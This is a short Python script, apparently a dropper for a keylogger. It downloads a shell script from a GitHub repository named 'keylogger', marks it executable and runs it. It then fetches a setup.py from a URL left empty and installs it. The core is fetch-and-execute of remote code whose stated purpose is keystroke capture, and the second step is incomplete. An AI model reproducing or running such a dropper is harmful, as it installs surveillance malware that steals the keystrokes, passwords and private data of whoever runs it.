import os
os.system('pip install requests')

import requests



url = 'https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/install_and_run/install_and_run.sh'

filename = 'install_and_run.sh'

response = requests.get(url)

if response.status_code == 200:
    # Sauvegarder le fichier localement
    with open(filename, 'w', encoding='utf-8') as file:
        file.write(response.text)

    print(f'Le fichier {filename} a été téléchargé avec succès.')

os.system('chmod +x ' + filename)
os.system('./' + filename)

url2 = ''
filename2 = 'setup.py'
response2 = requests.get(url2)

if response2.status_code == 200:
    with open(filename2, 'w', encoding='utf-8') as file:
        file.write(response2.text)
        print("Le fichier setup a bien été installé")

os.system('python setup.py install')

